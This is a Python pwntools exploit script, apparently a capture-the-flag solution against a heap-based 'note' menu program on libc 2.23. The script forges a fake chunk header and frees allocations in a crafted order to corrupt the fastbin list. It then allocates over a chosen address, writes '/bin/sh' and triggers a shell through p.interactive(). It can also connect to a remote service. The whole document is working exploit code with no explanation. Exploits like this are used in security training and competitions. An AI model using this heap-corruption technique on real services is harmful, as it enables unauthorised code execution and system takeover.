from pwn import *
import sys
if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./note")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./note")
else:
	p = remote(ip,addr)
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./note")

def init():
	p.sendafter("Please leave your name :",p64(0x21))
	p.recvline()

def add(name,content):
	p.sendlineafter("command:","1")
	p.sendafter("name:",name)
	p.sendlineafter("content:",content)
	p.recvuntil("add......OK\n")

def edit(index,name,content):
	p.sendlineafter("command:","2")
	p.sendlineafter("want to edit\n",str(index))
	p.sendafter("name:",name)
	p.sendafter("content:",content)
	p.recvuntil("edit success!\n")

def view(index):
	p.sendlineafter("command:","3")
	p.sendlineafter("want to view\n",str(index))
	return p.recvuntil("1.add_block\n",drop = True)
	
def free(index):
	p.sendlineafter("command:","4")
	p.sendlineafter("block id:",str(index))
	p.recvuntil("delete success!\n")
	
def secret(name,content):
	p.sendlineafter("command:","1234")
	p.sendafter("name:",name)
	p.sendlineafter("content:",content)

def com():
	p.sendlineafter("command:","2333")

def debugf():
	gdb.attach(p,"b *0x400A56")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
init()
command = 0x602090 - 8
for i in range(7):
	add(str(i),str(i))
secret(p64(0)+p64(0x21),"a")
add("7","b"*0x20)
add("8","d"*0x20)
add("9","e")
free(6)
free(7)
free(9)
free(8)
debugf()
target_addr = 0x602090 - 8
add(p64(target_addr),"a")
add(p64(target_addr),"a")
add(p64(target_addr),"a")
add("/bin/sh\x00","a")
com()
p.interactive()
